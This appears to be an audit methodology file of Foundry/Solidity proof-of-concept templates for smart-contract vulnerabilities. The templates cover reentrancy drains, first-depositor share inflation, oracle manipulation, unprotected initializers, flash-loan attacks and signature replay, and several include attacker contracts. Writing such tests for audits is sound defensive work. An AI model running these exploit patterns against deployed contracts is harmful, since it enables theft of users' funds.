# PoC Templates

Proof of Concept templates for every major vulnerability class. Every Critical/High finding **MUST** have a working PoC. Medium findings SHOULD have PoCs.

---

## Base Template (Foundry Fork Test)

All PoCs should extend this base:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";

contract BasePoCTest is Test {
    // Fork configuration
    string constant RPC_URL = "RPC_URL"; // Configure via environment or foundry.toml
    uint256 fork;

    // Actors
    address attacker = makeAddr("attacker");
    address victim = makeAddr("victim");
    address admin = makeAddr("admin");

    function setUp() public virtual {
        // Option A: Fork mainnet
        // fork = vm.createSelectFork(vm.envString(RPC_URL)); // Load from environment configuration

        // Option B: Local deployment
        // Deploy contracts here
    }

    // Helper: Fund an address with ETH and tokens
    function _fund(address who, address token, uint256 amount) internal {
        deal(token, who, amount);
        deal(who, 100 ether); // ETH for gas
    }

    // Helper: Log balances for audit trail
    function _logBalances(string memory label, address who, address token) internal view {
        console.log("--- %s ---", label);
        console.log("ETH:", who.balance);
        console.log("Token:", IERC20(token).balanceOf(who));
    }
}
```

---

## Template 1: Reentrancy PoC

```solidity
contract ReentrancyPoC is BasePoCTest {
    IVault vault;
    IERC20 token;
    MaliciousReceiver attackContract;

    function setUp() public override {
        super.setUp();
        // Deploy or connect to vulnerable vault
        // vault = IVault(address(new VulnerableVault(address(token))));
        attackContract = new MaliciousReceiver(address(vault), address(token));
    }

    function test_reentrancy_drain() public {
        // 1. Seed vault with victim funds
        uint256 vaultBalance = 100 ether;
        _fund(victim, address(token), vaultBalance);
        vm.startPrank(victim);
        token.approve(address(vault), vaultBalance);
        vault.deposit(vaultBalance, victim);
        vm.stopPrank();

        // 2. Attacker deposits small amount
        uint256 attackDeposit = 1 ether;
        _fund(attacker, address(token), attackDeposit);
        vm.startPrank(attacker);
        token.transfer(address(attackContract), attackDeposit);
        vm.stopPrank();

        // 3. Execute reentrancy attack
        uint256 balanceBefore = token.balanceOf(address(attackContract));
        attackContract.attack(attackDeposit);
        uint256 balanceAfter = token.balanceOf(address(attackContract));

        // 4. Assert profit
        uint256 profit = balanceAfter - balanceBefore;
        console.log("Attack profit:", profit);
        assertGt(profit, 0, "Reentrancy attack should be profitable");
        assertGt(profit, attackDeposit, "Should drain more than deposited");
    }
}

contract MaliciousReceiver {
    IVault vault;
    IERC20 token;
    uint256 attackCount;
    uint256 maxReentries = 5;

    constructor(address _vault, address _token) {
        vault = IVault(_vault);
        token = IERC20(_token);
    }

    function attack(uint256 amount) external {
        token.approve(address(vault), amount);
        vault.deposit(amount, address(this));
        vault.withdraw(amount, address(this), address(this));
    }

    // ERC-777 callback OR receive() for ETH
    receive() external payable {
        if (attackCount < maxReentries && address(vault).balance > 0) {
            attackCount++;
            vault.withdraw(1 ether, address(this), address(this));
        }
    }
}
```

---

## Template 2: Share Inflation / First Depositor PoC

```solidity
contract ShareInflationPoC is BasePoCTest {
    IVault vault;
    IERC20 token;

    function setUp() public override {
        super.setUp();
        // Deploy vault and token
    }

    function test_first_depositor_inflation() public {
        // 1. Attacker is first depositor — deposits minimal amount
        _fund(attacker, address(token), 1);
        vm.startPrank(attacker);
        token.approve(address(vault), 1);
        vault.deposit(1, attacker); // Gets 1 share for 1 wei
        vm.stopPrank();

        assertEq(vault.balanceOf(attacker), 1, "Attacker should have 1 share");

        // 2. Attacker donates large amount directly to vault
        uint256 donationAmount = 10_000e18;
        deal(address(token), attacker, donationAmount);
        vm.prank(attacker);
        token.transfer(address(vault), donationAmount);

        // 3. Victim deposits reasonable amount
        uint256 victimDeposit = 5_000e18;
        _fund(victim, address(token), victimDeposit);
        vm.startPrank(victim);
        token.approve(address(vault), victimDeposit);
        vault.deposit(victimDeposit, victim);
        vm.stopPrank();

        uint256 victimShares = vault.balanceOf(victim);
        console.log("Victim deposited:", victimDeposit);
        console.log("Victim shares:", victimShares);

        // 4. Assert vulnerability: victim gets 0 shares
        assertEq(victimShares, 0, "VULNERABLE: Victim got 0 shares — first depositor inflation!");

        // 5. Attacker redeems to steal victim's deposit
        vm.prank(attacker);
        uint256 attackerRedeemed = vault.redeem(vault.balanceOf(attacker), attacker, attacker);
        console.log("Attacker redeemed:", attackerRedeemed);
        assertGt(attackerRedeemed, donationAmount, "Attacker profits from victim's deposit");
    }
}
```

---

## Template 3: Oracle Manipulation PoC

```solidity
contract OracleManipulationPoC is BasePoCTest {
    ILendingPool pool;
    IOracle oracle;
    IUniswapV2Router router;
    IERC20 collateralToken;
    IERC20 borrowToken;

    function test_oracle_manipulation_borrow() public {
        // 1. Record price before manipulation
        uint256 priceBefore = oracle.getPrice(address(collateralToken));
        console.log("Price before:", priceBefore);

        // 2. Flash loan to manipulate reserves
        vm.startPrank(attacker);
        uint256 flashAmount = 1_000_000e18;
        deal(address(borrowToken), attacker, flashAmount);

        // Massive swap to move price
        borrowToken.approve(address(router), flashAmount);
        address[] memory path = new address[](2);
        path[0] = address(borrowToken);
        path[1] = address(collateralToken);
        router.swapExactTokensForTokens(flashAmount, 0, path, attacker, block.timestamp);

        // 3. Check manipulated price
        uint256 priceAfter = oracle.getPrice(address(collateralToken));
        console.log("Price after manipulation:", priceAfter);
        assertGt(priceAfter, priceBefore * 2, "Price should be inflated");

        // 4. Deposit collateral at inflated price, borrow against it
        uint256 collateralAmount = collateralToken.balanceOf(attacker);
        collateralToken.approve(address(pool), collateralAmount);
        pool.deposit(address(collateralToken), collateralAmount);

        uint256 maxBorrow = pool.getMaxBorrow(attacker, address(borrowToken));
        pool.borrow(address(borrowToken), maxBorrow);

        // 5. Swap back to restore price (optional — already profited)
        vm.stopPrank();

        console.log("Borrowed amount:", maxBorrow);
        console.log("Attacker profit:", maxBorrow - flashAmount);
    }
}
```

---

## Template 4: Access Control Bypass PoC

```solidity
contract AccessControlBypassPoC is BasePoCTest {
    IProtocol protocol;

    function test_unprotected_initialize() public {
        // Get implementation address (behind proxy)
        address implementation = _getImplementation(address(protocol));

        // Anyone can call initialize on unprotected implementation
        vm.prank(attacker);
        (bool success,) = implementation.call(
            abi.encodeWithSignature("initialize(address)", attacker)
        );

        assertTrue(success, "Initialize should succeed on unprotected impl");

        // Now attacker is owner of implementation
        address owner = IOwnable(implementation).owner();
        assertEq(owner, attacker, "Attacker is now owner of implementation");
    }

    function test_missing_access_control() public {
        // Attacker calls admin function without restriction
        vm.prank(attacker);
        protocol.setFee(10000); // 100% fee
        assertEq(protocol.fee(), 10000, "Attacker changed fee without auth");
    }

    function _getImplementation(address proxy) internal view returns (address) {
        bytes32 slot = bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1);
        return address(uint160(uint256(vm.load(proxy, slot))));
    }
}
```

---

## Template 5: Flash Loan Attack PoC

```solidity
contract FlashLoanAttackPoC is BasePoCTest {
    IVault vault;
    IAaveFlashLoan flashLoanProvider;
    IERC20 token;

    function test_flash_loan_exploit() public {
        // Seed vault with TVL
        _fund(address(vault), address(token), 1_000_000e18);

        // Execute flash loan attack
        vm.startPrank(attacker);
        uint256 balanceBefore = token.balanceOf(attacker);

        // Request flash loan
        flashLoanProvider.flashLoan(
            address(this),          // receiver
            address(token),         // asset
            10_000_000e18,         // amount
            abi.encode(/* attack params */)
        );

        uint256 balanceAfter = token.balanceOf(attacker);
        uint256 profit = balanceAfter - balanceBefore;

        console.log("Flash loan profit:", profit);
        assertGt(profit, 0, "Flash loan attack should be profitable");
        vm.stopPrank();
    }

    // Flash loan callback
    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        // 1. Use flash-loaned funds to manipulate
        // 2. Extract value from vulnerable protocol
        // 3. Repay flash loan + premium

        IERC20(asset).approve(address(flashLoanProvider), amount + premium);
        return true;
    }
}
```

---

## Template 6: Cross-Function Sequence PoC

```solidity
contract CrossFunctionPoC is BasePoCTest {
    IProtocol protocol;

    function test_deposit_upgrade_withdraw() public {
        // Phase 1: User deposits
        vm.startPrank(victim);
        protocol.deposit{value: 10 ether}();
        uint256 sharesBefore = protocol.balanceOf(victim);
        vm.stopPrank();

        // Phase 2: Admin upgrades (simulated)
        vm.startPrank(admin);
        // Deploy new implementation with storage layout change
        address newImpl = address(new NewImplementation());
        protocol.upgradeToAndCall(newImpl, "");
        vm.stopPrank();

        // Phase 3: User withdraws — does state survive upgrade?
        vm.startPrank(victim);
        uint256 sharesAfter = protocol.balanceOf(victim);

        assertEq(sharesAfter, sharesBefore, "Shares corrupted by upgrade!");

        uint256 withdrawn = protocol.withdraw(sharesAfter);
        assertGe(withdrawn, 10 ether, "User should get back at least their deposit");
        vm.stopPrank();
    }
}
```

---

## Template 7: Reverse Impact PoC (for [REVERSE-*] findings)

```solidity
contract ReverseImpactPoC is BasePoCTest {
    IProtocol protocol;
    IERC20 token;

    function test_reverse_impact_fund_drain() public {
        // 1. Setup: Protocol has TVL from honest users
        uint256 tvl = 100_000e18;
        _fund(address(protocol), address(token), tvl);

        // 2. Attacker arranges preconditions identified by backward trace
        vm.startPrank(attacker);
        uint256 attackerInitialBalance = token.balanceOf(attacker);

        // 3. Execute the attack path discovered via reverse impact hunt
        //    Each step corresponds to a hop in the backward trace
        // Step A: [first hop from REVERSE finding]
        // Step B: [second hop]
        // Step C: [terminal action that produces catastrophic outcome]

        uint256 attackerFinalBalance = token.balanceOf(attacker);
        uint256 protocolFinalBalance = token.balanceOf(address(protocol));
        vm.stopPrank();

        // 4. Assert catastrophic outcome occurred
        uint256 profit = attackerFinalBalance - attackerInitialBalance;
        console.log("Attacker profit:", profit);
        console.log("Protocol loss:", tvl - protocolFinalBalance);

        assertGt(profit, 0, "Attacker should profit from the attack");
        assertLt(protocolFinalBalance, tvl, "Protocol should have lost funds");
    }
}
```

---

## Template 8: Boundary Value PoC (for [BOUNDARY-*] findings)

```solidity
contract BoundaryValuePoC is BasePoCTest {
    IProtocol protocol;
    IERC20 token;

    function test_boundary_zero_totalSupply() public {
        // Test: What happens when totalSupply == 0 (first deposit)?
        // This is the most common boundary value bug class

        // 1. Attacker makes first deposit of 1 wei
        _fund(attacker, address(token), 1);
        vm.startPrank(attacker);
        token.approve(address(protocol), 1);
        protocol.deposit(1, attacker);
        vm.stopPrank();

        // 2. Attacker donates to inflate share price
        uint256 donation = 10_000e18;
        deal(address(token), attacker, donation);
        vm.prank(attacker);
        token.transfer(address(protocol), donation);

        // 3. Victim deposits — gets 0 shares due to rounding
        uint256 victimDeposit = 5_000e18;
        _fund(victim, address(token), victimDeposit);
        vm.startPrank(victim);
        token.approve(address(protocol), victimDeposit);
        protocol.deposit(victimDeposit, victim);
        vm.stopPrank();

        // 4. Assert boundary value bug
        uint256 victimShares = protocol.balanceOf(victim);
        console.log("Victim deposited:", victimDeposit);
        console.log("Victim shares:", victimShares);
        assertEq(victimShares, 0, "BOUNDARY BUG: Victim got 0 shares at totalSupply boundary");
    }

    function test_boundary_max_uint() public {
        // Test: What happens with type(uint256).max input?
        vm.startPrank(attacker);
        vm.expectRevert(); // Should revert, not overflow silently
        protocol.deposit(type(uint256).max, attacker);
        vm.stopPrank();
    }

    function test_boundary_self_reference() public {
        // Test: What happens when from == to (self-transfer)?
        _fund(attacker, address(token), 100e18);
        vm.startPrank(attacker);
        token.approve(address(protocol), 100e18);
        protocol.deposit(100e18, attacker);

        uint256 balanceBefore = protocol.balanceOf(attacker);
        // Self-transfer: from == to
        protocol.transfer(attacker, 50e18);
        uint256 balanceAfter = protocol.balanceOf(attacker);
        vm.stopPrank();

        assertEq(balanceAfter, balanceBefore, "Self-transfer should not change balance");
    }
}
```

---

## Template 9: State Desync PoC (for [STALE-*] and [CONFLICT-*] findings)

```solidity
contract StateDesyncPoC is BasePoCTest {
    IProtocol protocol;
    IERC20 token;

    function test_stale_read_via_callback() public {
        // Test: State variable read is stale because callback modified it

        // 1. Setup: Deposit to create state
        _fund(victim, address(token), 100e18);
        vm.startPrank(victim);
        token.approve(address(protocol), 100e18);
        protocol.deposit(100e18, victim);
        vm.stopPrank();

        // 2. Deploy malicious token/contract that re-enters during callback
        MaliciousCallback attacker_contract = new MaliciousCallback(address(protocol));

        // 3. Trigger the flow that reads state → external call → state modified in callback → original function uses stale value
        vm.startPrank(attacker);
        uint256 stateBefore = protocol.someStateVariable();
        attacker_contract.triggerAttack();
        uint256 stateAfter = protocol.someStateVariable();
        vm.stopPrank();

        // 4. Assert state desync
        console.log("State before:", stateBefore);
        console.log("State after:", stateAfter);
        // The desync means the invariant (stateA == stateB always) is broken
        assertFalse(
            protocol.checkInvariant(),
            "STATE DESYNC: Invariant broken after stale read exploitation"
        );
    }
}

contract MaliciousCallback {
    IProtocol protocol;

    constructor(address _protocol) {
        protocol = IProtocol(_protocol);
    }

    function triggerAttack() external {
        // Call function that triggers callback
        protocol.withdraw(1e18, address(this), address(this));
    }

    // Callback (receive / onERC721Received / tokensReceived)
    receive() external payable {
        // Re-enter: modify state during the callback window
        // This creates the stale read condition
        protocol.someModifyingFunction();
    }
}
```

---

## Template 10: Token Integration PoC (Fee-on-Transfer / Rebasing)

```solidity
contract TokenIntegrationPoC is BasePoCTest {
    IProtocol protocol;
    MockFeeToken feeToken;

    function setUp() public override {
        super.setUp();
        // Deploy mock token that takes 10% fee on transfer
        feeToken = new MockFeeToken(10);
        // ... protocol setup
    }

    function test_fee_on_transfer_accounting_bug() public {
        // 1. Setup: Victim has 100 tokens, attacker has 100 tokens
        _fund(victim, address(feeToken), 100e18);
        _fund(attacker, address(feeToken), 100e18);

        // 2. Victim deposits 100 tokens.
        // Due to 10% fee, protocol actually receives 90 tokens.
        // VULNERABILITY: Protocol mints shares based on the argument (100), not actual received.
        vm.startPrank(victim);
        feeToken.approve(address(protocol), 100e18);
        protocol.deposit(100e18, victim);
        vm.stopPrank();

        uint256 protocolBalance = feeToken.balanceOf(address(protocol));
        console.log("Protocol actual balance:", protocolBalance);
        
        uint256 victimShares = protocol.balanceOf(victim);
        console.log("Victim shares minted:", victimShares);

        // 3. Attacker deposits to exploit the resulting insolvency
        vm.startPrank(attacker);
        feeToken.approve(address(protocol), 20e18);
        protocol.deposit(20e18, attacker);
        
        // 4. Attacker forces protocol insolvency by withdrawing more than its fair share
        uint256 attackerShares = protocol.balanceOf(attacker);
        protocol.withdraw(attackerShares, attacker, attacker);
        vm.stopPrank();

        // 5. Assert Victim cannot withdraw their full shares due to bad debt
        vm.startPrank(victim);
        vm.expectRevert(); // Typically reverts due to arithmetic underflow or failed transfer
        protocol.withdraw(victimShares, victim, victim);
        vm.stopPrank();
        
        assertTrue(true, "VULNERABILITY: Protocol becomes insolvent due to Fee-on-Transfer accounting failure");
    }
}

contract MockFeeToken is ERC20 {
    uint256 public feePercentage;
    
    constructor(uint256 _feePercentage) ERC20("Mock Fee Token", "MFT") {
        feePercentage = _feePercentage;
    }

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }

    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        uint256 fee = (amount * feePercentage) / 100;
        uint256 amountToReceiver = amount - fee;
        
        _transfer(from, address(this), fee); // Send fee to contract
        _transfer(from, to, amountToReceiver);
        
        // Approve standard ERC20 behavior where allowance is decremented
        uint256 currentAllowance = allowance(from, _msgSender());
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(from, _msgSender(), currentAllowance - amount);
        
        return true;
    }
}
```

---

## Template 11: Signature Replay PoC

```solidity
contract SignatureReplayPoC is BasePoCTest {
    IProtocol protocol;
    IERC20 token;
    
    // Test accounts with known private keys
    uint256 victimPrivateKey = 0xA11CE;
    address victimSigner;

    function setUp() public override {
        super.setUp();
        victimSigner = vm.addr(victimPrivateKey);
        _fund(victimSigner, address(token), 100_000e18);
    }

    function test_signature_replay() public {
        // 1. Victim signs an intent/permit to do an operation once
        bytes32 structHash = keccak256(
            abi.encode(
                keccak256("Operation(address user,uint256 amount)"),
                victimSigner,
                100e18
            )
        );
        
        // Note: Vulnerable protocol doesn't include nonce or chainId in the hash
        bytes32 digest = keccak256(
            abi.encodePacked("\x19\x01", protocol.DOMAIN_SEPARATOR(), structHash)
        );
        
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(victimPrivateKey, digest);
        bytes memory signature = abi.encodePacked(r, s, v);

        // 2. Relayer (or anyone) executes the operation normally the first time
        vm.prank(attacker);
        protocol.executeOperation(victimSigner, 100e18, signature);
        
        uint256 balanceAfterFirst = token.balanceOf(victimSigner);
        console.log("Victim balance after 1st execution:", balanceAfterFirst);

        // 3. Attacker REPLAYS the exact same signature because there's no nonce!
        vm.startPrank(attacker);
        protocol.executeOperation(victimSigner, 100e18, signature);
        protocol.executeOperation(victimSigner, 100e18, signature);
        protocol.executeOperation(victimSigner, 100e18, signature);
        vm.stopPrank();

        uint256 balanceAfterReplay = token.balanceOf(victimSigner);
        console.log("Victim balance after REPLAYS:", balanceAfterReplay);

        // 4. Assert Replay Vulnerability Extracted Value
        uint256 drainedAmount = 100_000e18 - balanceAfterReplay;
        assertGt(drainedAmount, 100e18, "VULNERABILITY: Signature was replayed multiple times!");
    }
}
```

---

## Validation Requirements

### 3x Reproducibility Check
Every PoC must pass with 3 different input sets:
```bash
# Run 1: Default values
forge test --match-test test_exploit -vvv

# Run 2: Different amounts (use fuzz)
forge test --match-test test_exploit --fuzz-runs 100 -vvv

# Run 3: Different block/timestamp
FOUNDRY_BLOCK_NUMBER=18000000 forge test --match-test test_exploit -vvv
```

### Impact Quantification
Every PoC must log:
1. **TVL at risk**: Total assets in the contract
2. **Profit extracted**: Attacker's net gain
3. **Cost of attack**: Gas + capital required
4. **Users affected**: Number of users who lose funds
5. **Recovery possibility**: Can funds be recovered?

### PoC Quality Checklist
- [ ] Compiles and runs: `forge test --match-test test_exploit -vvv`
- [ ] Uses realistic values (not just 1 wei tests)
- [ ] Logs clear output showing exploit success
- [ ] Asserts specific conditions (not just "no revert")
- [ ] Includes comments explaining each attack step
- [ ] Works on mainnet fork if applicable
